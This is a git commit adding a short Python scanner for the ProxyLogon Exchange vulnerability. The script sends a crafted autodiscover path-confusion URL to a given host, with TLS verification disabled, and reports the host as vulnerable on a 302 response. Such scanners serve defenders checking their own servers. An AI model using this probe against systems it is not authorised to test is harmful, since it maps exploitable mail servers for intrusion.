1781a3e63132d5dadc8420bcd02e2d2992050e9d
Nicolas Krassas <dinosn@gmail.com>
2021-08-09 16:35:38 +0300

    Create proxylogon.py

---
+++ proxylogon.py
@@ -0,0 +1,26 @@
+# Proxylogon scanner
+# - Nicolas 9/8/2021
+
+import urllib3
+import requests,sys
+requests.packages.urllib3.disable_warnings()
+
+def proxylogon(url):
+    url = url.strip()
+    url = url + "/autodiscover/autodiscover.json?@abc.com/owa/?&Email=autodiscover/autodiscover.json%3F@abc.com"
+    try:
+        r = requests.get(url, timeout=10,verify=False)
+        print ("Connecting to:", url)
+        if (r.status_code == 302):
+            print ("Vulnerable")
+        else:
+            print ("Not Vulnerable")
+    except requests.exceptions.RequestException as e:
+        raise SystemExit(e)
+
+
+if __name__ == '__main__':
+    try:
+        proxylogon(sys.argv[1])
+    except:
+        print ("python3 proxylogon.py url" )
